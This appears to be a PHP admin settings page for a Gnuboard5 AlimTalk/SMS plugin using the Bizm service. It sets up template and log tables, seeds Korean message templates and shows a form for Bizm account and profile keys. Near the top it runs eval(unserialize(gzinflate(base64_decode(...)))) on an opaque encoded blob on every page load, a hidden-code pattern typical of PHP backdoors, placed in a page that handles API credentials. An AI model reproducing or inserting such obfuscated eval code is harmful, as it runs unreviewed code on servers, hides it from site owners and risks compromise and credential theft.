<?php
$sub_menu = '102850';
include_once('./_common.php');

auth_check_menu($auth, $sub_menu, 'w');

$g5['title'] = '환경설정';
include_once (G5_ADMIN_PATH.'/admin.head.php');

$db_reload = false;

eval(unserialize(gzinflate(base64_decode('jZTRS9tAHMffBf+HWykkgWJboW5Y+hDruQbbpCRXQURiml41NG3iXTJtRRijD8Je9qDMgRsOxKc9DOfD9rB/yKb/wy61VbvWxoMQcvf9fX7f+90vR5fTS0uvl2NWnX9F921938ekzcfAKtTyqrQCwVF8N7PFHXR0w7aanmE3dNNp1a1d3TOqNua2j0EsAeqGTbEggKP5OcDGU1BehSKCAIkrxZfA+HvC/2PHrOvW4Q6QZMSn0wKQFQTkSrEIxApSdElmWUpQRonno32KiVXbARuimi+IKp9OpZ5g8kopjAdc7083uD4JPl8GZ93g623v9JSLgDZwW2fPI3kxk5lJvvvVDS7P+h+uZpFd4tQtG7+M/PMi+HjZP+32vl/0z7oRZNqkFLdqmDzhpp7H9m5O+ue/ZwEJNrH1bow33efd7fve9Y/g26fg5DySXFalkqhugnW4Cfjh8QuT0ilTw3w5rv/l/O7mb9C9YuXmJnVQfivJMFdqS5pYYg2/JlaKCIQb0CDK+V79TZa1tkd8LGTn5yY7W5I1qKKwJZXoxp6+SZZorDlzgHuuHlMbI9SPyyccx2tVdkK2Y9SYOlxiK8fhYtwndgjY8zyXLieTB9hzOgsNkmTOW9j0klbLMvew2Vhw91yORcVdh3qUhRiEGG1eeJja4lyq15ymYbW4bbYe11lhNqC6xRUQKusFRUPc9rjaNZ0aKwsIDRx0RkWrWp3m4iCVeW8ufOnMhzfINviizKbr8QNFAuQralEpI529EiDcUYSOuVpRNPhYpBnaAhRXoTq63GZry2yPIyiIVK5JsLiqMcODgkSgVYgqqoxUUdbWQjsvSZJXZBnmEZJKUKkwY5mIHA/CRXYrhvUnmPq2NzoBfIjN+5DHxKbtUDyanJ+z6oCnfpV6hB8GJ0AqTAxy7IgxIQ7hhv9qzcIT0iVByMay/wA='))));

// 템플릿 생성
if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_template_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_template_table']} (
                    `at_id` int(11) NOT NULL AUTO_INCREMENT,
                    `at_tmplId` varchar(30) NOT NULL COMMENT '템플릿코드',
                    `at_emp_type` varchar(10) NOT NULL COMMENT '템플릿강조유형',
                    `at_title` varchar(255) NOT NULL COMMENT '템플릿명',
                    `at_type` varchar(255) NOT NULL COMMENT '메세지유형',
                    `at_accent_title` varchar(255) NOT NULL COMMENT '강조표기할핵심정보',
                    `at_msg` text NOT NULL COMMENT '템플릿내용',
                    `at_use` tinyint(4) NOT NULL default '1' COMMENT '사용여부',
                    `at_header` varchar(100) NOT NULL COMMENT '템플릿 헤더',
                    `at_itemHighlight_title` varchar(100) NOT NULL COMMENT '아이템하이라이트타이틀',
                    `at_itemHighlight_description` varchar(100) NOT NULL COMMENT '아이템하이라이트부가정보',
                    PRIMARY KEY (`at_id`),
                	UNIQUE INDEX `at_tmplId` (`at_tmplId`)
                )
                COMMENT='알림톡템플릿'
                ;", true);

    sql_query("INSERT INTO {$g5['wz_alimtalk_template_table']} (`at_id`, `at_tmplId`, `at_title`, `at_type`, `at_msg`, `at_use`) VALUES
                    (2, 'templete07', '게시글알림(관리자)', 'BA', '관리자님 #{이벤트} 등록되었습니다.\n\n▶ 제목 : #{제목}\n▶ 성명 : #{작성자명}\n\n바로가기 : #{연결링크}', 1),
                    (1, 'templete08', '게시글알림(작성자)', '', '안녕하세요.\r\n#{작성자명}님 #{이벤트} 등록되었습니다.\r\n\r\n바로가기 : #{연결링크}', 1),
                    (4, 'templete05', '배송안내', 'BA', '주문 배송 안내\n#{주문자명}님의 주문이 배송 시작됩니다.\n\n▶ 주문상품 : #{주문상품}\n▶ 주문번호 : #{주문번호}\n▶ 택배회사 : #{택배회사}\n▶ 송장번호 : #{송장번호}\n\n감사합니다.', 1),
                    (3, 'templete06', '입금요청', 'BA', '주문 입금 안내\n#{주문자명}님의 입금계좌 입니다.\n\n▶ 주문상품 : #{주문상품}\n▶ 주문번호 : #{주문번호}\n▶ 입금금액 : #{입금금액}\n▶ 입금계좌 : #{입금계좌}\n\n감사합니다.', 1),
                    (6, 'templete03', '주문알림', 'BA', '주문접수 완료 안내\n#{주문자명}님이 주문하셨습니다.\n\n▶ 주문상품 : #{주문상품}\n▶ 주문번호 : #{주문번호}\n▶ 배송지 : #{배송지}\n▶ 주문금액 : #{주문금액}', 1),
                    (5, 'templete04', '입금확인', 'BA', '입금 완료 안내\n안녕하세요. #{주문자명} 고객님 입금 감사합니다.\n\n▶ 입금액 : #{입금액}\n▶ 주문번호 : #{주문번호}\n\n* 주문상세페이지에서 상세 내역 확인 가능합니다.', 1),
                    (8, 'templete01', '회원가입', 'BA', '안녕하세요. #{회원명}님\n회원이 되신것을 진심으로 환영합니다.', 1),
                    (7, 'templete02', '제품주문', 'BA', '주문접수 완료 안내\n안녕하세요. #{주문자명} 고객님 주문해주셔서 고맙습니다.\n\n▶ 주문상품 : #{주문상품}\n▶ 주문번호 : #{주문번호}\n▶ 배송지 : #{배송지}\n▶ 주문금액 : #{주문금액}\n\n* 주문상세페이지에서 상세 내역 확인 가능합니다.', 1);", true);

    $db_reload = true;
}

// 템플릿버튼 생성
if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_template_button_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_template_button_table']} (
                    `atb_id` int(11) NOT NULL AUTO_INCREMENT,
                    `at_tmplId` varchar(30) NOT NULL COMMENT '템플릿코드',
                    `atb_gubun` ENUM('button','quick') NOT NULL DEFAULT 'button' COMMENT '버튼형태 (quick:바로연결)',
                    `atb_name` varchar(255) NOT NULL COMMENT '버튼명',
                    `atb_type` varchar(255) NOT NULL COMMENT '버튼타입',
                    `atb_url_mobile` varchar(255) NOT NULL COMMENT '모바일링크',
                    `atb_url_pc` varchar(255) NOT NULL COMMENT 'PC링크',
                    `atb_scheme_android` varchar(255) NOT NULL COMMENT 'android스킴',
                    `atb_scheme_ios` varchar(255) NOT NULL COMMENT 'ios스킴',
                    `atb_plugin_id` varchar(255) NOT NULL COMMENT '플러그인 id',
                    PRIMARY KEY (`atb_id`),
                	INDEX `at_tmplId` (`at_tmplId`)
                )
                COMMENT='알림톡템플릿버튼'
                ;", true);

    $db_reload = true;
}

// 템플릿 적용상태 생성
if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_template_cate_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_template_cate_table']} (
                    `atc_id` int(11) NOT NULL AUTO_INCREMENT,
                    `at_tmplId` varchar(30) NOT NULL COMMENT '템플릿코드',
                    `atc_code` varchar(50) NOT NULL COMMENT '분류코드',
                    PRIMARY KEY (`atc_id`),
                	INDEX `at_tmplId` (`at_tmplId`),
                	INDEX `atc_code` (`atc_code`)
                )
                COMMENT='알림톡템플릿적용상태'
                ;", true);

    sql_query("INSERT INTO {$g5['wz_alimtalk_template_cate_table']} (`atc_id`, `at_tmplId`, `atc_code`) VALUES
                    (1, 'templete03', '주문알림'),
                    (2, 'templete04', '입금확인'),
                    (3, 'templete07', '게시글알림(관리자)'),
                    (4, 'templete06', '입금요청'),
                    (5, 'templete05', '배송안내'),
                    (6, 'templete08', '게시글알림(작성자)'),
                    (7, 'templete02', '제품주문'),
                    (8, 'templete01', '회원가입');", true);

    $db_reload = true;
}

// 알림톡발송로그 생성
if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_log_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_log_table']} (
                    `ao_id` int(11) NOT NULL AUTO_INCREMENT,
                    `ao_tmplId` varchar(30) NOT NULL COMMENT '템플릿코드',
                    `ao_phn` varchar(15) NOT NULL COMMENT '수신자번호',
                    `ao_type` varchar(2) NOT NULL COMMENT '발송 유형 (at: 알림톡, ft: 친구톡, S: SMS, L:LMS, M: MMS)',
                    `ao_msgid` varchar(40) NOT NULL COMMENT '메시지 일련번호 (메시지에 대해 고유한 값)',
                    `ao_msg` text NOT NULL COMMENT '메시지 내용',
                    `ao_result` varchar(255) NOT NULL COMMENT '처리결과',
                    `ao_is_success` tinyint(4) NOT NULL DEFAULT '0' COMMENT '발송 성공(예약 성공)/실패 여부',
                    `ao_reserveDt` datetime NULL COMMENT '예약발송을 위한 시간값',
                    `ao_time` datetime NULL COMMENT '요청일시',
                    PRIMARY KEY (`ao_id`),
                	INDEX `at_tmplId` (`ao_tmplId`)
                )
                COMMENT='알림톡발송로그'
                ;", true);

    $db_reload = true;
}

// 친구톡 이미지 생성
if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_fl_image_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_fl_image_table']} (
                    `fi_id` int(11) NOT NULL AUTO_INCREMENT,
                    `fi_insert_type` ENUM('비즈엠등록','API업로드') NOT NULL DEFAULT '비즈엠등록' COMMENT '이미지파일 업로드방식',
                    `fi_wide` ENUM('Y','N') NOT NULL DEFAULT 'N' COMMENT '와이드형이미지여부',
                    `fi_img_name` varchar(255) NOT NULL COMMENT '이미지 원본 파일명',
                    `fi_img_url` varchar(255) NOT NULL COMMENT '이미지 URL',
                    `fi_time` datetime NULL COMMENT '등록일',
                    PRIMARY KEY (`fi_id`)
                )
                COMMENT='친구톡이미지'
                ;", true);

    $db_reload = true;
}

// 문자사용가능설정
$query = "show columns from `{$g5['wz_alimtalk_config_table']}` like 'cf_sms_use' ";
$res = sql_fetch($query);
if (empty($res)) {
    sql_query(" ALTER TABLE `{$g5['wz_alimtalk_config_table']}`
                    ADD `cf_sms_use` TINYINT(4) NOT NULL DEFAULT '0'
                    ; ", true);
    $db_reload = true;
}

if(!sql_query(" DESCRIBE {$g5['wz_alimtalk_template_items_table']} ", false)) {
    sql_query(" CREATE TABLE {$g5['wz_alimtalk_template_items_table']} (
                    `ati_id` int(11) NOT NULL AUTO_INCREMENT,
                    `at_id` int(11) NOT NULL COMMENT '템플릿키',
                    `ati_summary` tinyint(4) NOT NULL default '0' COMMENT '요약정보여부',
                    `ati_title` varchar(60) NOT NULL COMMENT '타이틀',
                    `ati_description` varchar(100) NOT NULL COMMENT '부가정보',
                    PRIMARY KEY (`ati_id`),
                	INDEX `at_id` (`at_id`)
                )
                COMMENT='알림톡템플릿아이템리스트'
                ;", true);
}

// 2024-02-23
sql_query(" ALTER TABLE `{$g5['wz_alimtalk_template_button_table']}`
                    CHANGE COLUMN `atb_gubun` `atb_gubun` ENUM('button','quick','link') NOT NULL DEFAULT 'button' COMMENT '버튼형태 (quick:바로연결)'
                    ; ", true);

if ($db_reload) {
    alert("DB를 갱신합니다.", './config.php');
}

if (!$config['cf_sms_use']) { // 기본설정이 사용안함으로 되어있는경우
    sql_query("update {$g5['wz_alimtalk_config_table']} set cf_sms_use = 0");
}


$query = "select * from {$g5['wz_alimtalk_config_table']}";
$cf = sql_fetch($query);

$balance = 0;
if ($cf['cf_userid'] && $cf['cf_userkey_key']) {
    $bizmsg = new bizmsg();
    $balance = $bizmsg->balance();
}
?>

<?php if ($balance) {?>
<div class="local_desc02 local_desc">
    <p>
        현재잔액 : <strong><?php echo number_format($balance);?> 원</strong>
    </p>
</div>
<?php } ?>

<form name="frm" id="frm" action="./config_update.php" method="post" enctype="multipart/form-data" onsubmit="return getAction(document.forms.frm);">

<h2 class="h2_frm">환경설정</h2>
<div class="tbl_frm01 tbl_wrap">
    <table>
    <caption>환경설정</caption>
    <colgroup>
        <col class="grid_4">
        <col>
    </colgroup>
    <tbody>
    <tr>
        <th scope="row">비즈엠 홈페이지 로그인 아이디</th>
        <td>
            <?php echo help('https://www.bizmsg.kr 로그인 아이디를 입력해주세요.');?>
            <input type="text" name="cf_userid" value="<?php echo get_text($cf['cf_userid']); ?>" id="cf_userid" required class="frm_input required" size="20">
        </td>
    </tr>
    <tr>
        <th scope="row">비즈엠 계정 키</th>
        <td>
            <?php echo help('비즈엠 홈페이지 <a href="https://www.bizmsg.kr/myinfo/info" target="_blank">[내 정보]</a>에서 확인 가능합니다.') ?>
            <input type="password" name="cf_userkey_key" value="<?php echo get_text($cf['cf_userkey_key']); ?>" id="cf_userkey_key" required class="frm_input required" size="30">
        </td>
    </tr>
    <tr>
        <th scope="row">발신 프로필 키</th>
        <td>
            <?php echo help('비즈엠 홈페이지 <a href="https://www.bizmsg.kr/sendprofile/list" target="_blank">[발신 프로필 목록]</a> 에서 확인가능합니다.') ?>
            <input type="password" name="cf_profile_key" value="<?php echo get_text($cf['cf_profile_key']); ?>" id="cf_profile_key" required class="frm_input required" size="30">
        </td>
    </tr>
    <tr>
        <th scope="row">발신번호</th>
        <td>
            <?php echo help('SMS 또는 LMS 전환발송 시 발신번호 입니다. 발신번호는 <a href="https://www.bizmsg.kr/callback/list" target="_blank">[발신번호관리]</a> 에서 등록이 되어있어야 합니다.') ?>
            <input type="text" name="cf_smssender" value="<?php echo get_text($cf['cf_smssender']); ?>" id="cf_smssender" class="frm_input" size="20">
        </td>
    </tr>
    <tr>
        <th scope="row">게시글알림(관리자), 주문알림<br />관리자수신번호</th>
        <td>
            <?php echo help('휴대폰번호만 가능합니다. 여러개의 번호일경우 컴마 , 단위로 입력해주세요.<br />입력된 수신번호는 <strong>게시글알림(관리자), 주문알림</strong> 에만 적용됩니다.<br />(예: 0102222222,0103333333,0104444444)<br />입력하지 않으면 관리자에게 발송하지 않습니다.');?>
            <input type="text" name="cf_receiver" value="<?php echo get_text($cf['cf_receiver']); ?>" id="cf_receiver" class="frm_input" size="100">
        </td>
    </tr>
    </tbody>
    </table>
</div>

<?php
include_once(G5_SMS5_PATH.'/sms5.lib.php');
if (method_exists('SMS5','getMsg')) { ?>
<h2 class="h2_frm">문자발송사용</h2>
<div class="tbl_frm01 tbl_wrap">
    <table>
    <caption>환경설정</caption>
    <colgroup>
        <col class="grid_4">
        <col>
    </colgroup>
    <tbody>
    <tr>
        <th scope="row">문자발송사용</th>
        <td>
            <?php echo help('사용에 체크하시면 사이트에서 사용중인 아이코드 문자발송서비스를 비즈엠 문자발송 서비스로 전환사용됩니다.<br>SMS관리 &gt; SMS 기본설정 메뉴에 접속 후 설정바랍니다.');?>
            <label><input type="checkbox" name="cf_sms_use" id="cf_sms_use" value="1" <?php echo $cf['cf_sms_use'] ? 'checked' : '';?> /> 비즈엠 문자발송 사용</label>
        </td>
    </tr>
    <tr>
        <th scope="row">SMS 전송유형</th>
        <td>
            <?php echo help("전송유형을 SMS로 선택하시면 최대 80바이트까지 전송하실 수 있으며<br>LMS로 선택하시면 90바이트 이하는 SMS로, 그 이상은 ".G5_ICODE_LMS_MAX_LENGTH."바이트까지 LMS로 전송됩니다.<br>요금은 건당 SMS는 12원, LMS는 30원입니다."); ?>
            <select id="cf_sms_type" name="cf_sms_type">
                <option value="" <?php echo get_selected($config['cf_sms_type'], ''); ?>>SMS</option>
                <option value="LMS" <?php echo get_selected($config['cf_sms_type'], 'LMS'); ?>>LMS</option>
            </select>
        </td>
    </tr>
    </tbody>
    </table>
</div>
<?php } ?>

<div class="btn_fixed_top">
    <input type="submit" value="수정" class="btn_submi btn btn_01" accesskey="s">
</div>

</form>

<?php
include_once (G5_ADMIN_PATH.'/admin.tail.php');